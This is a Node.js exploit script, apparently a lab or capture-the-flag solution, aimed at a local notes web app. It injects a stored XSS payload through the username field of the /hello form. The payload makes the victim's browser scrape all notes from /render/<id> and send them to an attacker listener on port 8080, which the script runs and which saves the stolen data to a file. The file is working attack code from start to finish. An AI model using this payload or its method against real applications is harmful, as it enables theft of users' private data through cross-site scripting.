const http = require('http');
const fs = require('fs');
const { URL } = require('url');

// --- The Final, Correct Attack --- //

// 1. The payload is a script that scrapes notes and sends them back.
const exfiltration_script = `
(async function() {
    // This log will appear in the BROWSER console (F12)
    console.log('[Payload] XSS via username executed!');
    try {
        const notes = [];
        let id = 1;
        while(true) {
            const r = await fetch('http://127.0.0.1:5000/render/' + id);
            if (r.status === 404) break;
            notes.push(await r.text());
            id++;
        }
        console.log('[Payload] Notes scraped. Exfiltrating...');
        new Image().src = 'http://127.0.0.1:8080/exfiltrated?data=' + encodeURIComponent(JSON.stringify(notes));
    } catch (e) {
        console.error('[Payload] Error:', e);
    }
})();
`;

// 2. The username will be our script tag.
const malicious_username = `<script>${exfiltration_script}</script>`;

// --- Server and Injection Logic ---

const server = http.createServer((req, res) => {
    if (req.url.startsWith('/exfiltrated')) {
        const data = new URL(req.url, `http://${req.headers.host}`).searchParams.get('data');
        console.log('\n[Node] !!!!!!! VICTORY !!!!!!!');
        console.log('[Node] Exfiltrated data received:');
        fs.writeFileSync('results.txt', decodeURIComponent(data));
        console.log('[Node] Data saved to results.txt.');
        res.writeHead(204); // No content
        res.end();
        server.close(() => console.log('[Node] Server shut down.'));
    }
});

async function inject() {
    console.log('[Node] Injecting malicious username...');
    const formData = new FormData();
    formData.append('username', malicious_username);
    try {
        const response = await fetch('http://127.0.0.1:5000/hello', { method: 'POST', body: formData });
        console.log(`[Node] Injection status: ${response.status}.`);
        console.log('[Node] Payload injected. The XSS will trigger when the /hello page is loaded or reloaded.');
    } catch (e) {
        console.error('[Node] Injection failed:', e.message);
        server.close();
    }
}

server.on('error', (e) => {
    if (e.code === 'EADDRINUSE') {
        console.error('[Node] FATAL: Port 8080 is already in use. Please stop the other process manually.');
        process.exit(1);
    } else {
        console.error('[Node] Server error:', e);
    }
});

server.listen(8080, '127.0.0.1', () => {
    console.log('[Node] Server started on port 8080 to listen for exfiltrated data.');
    inject();
});
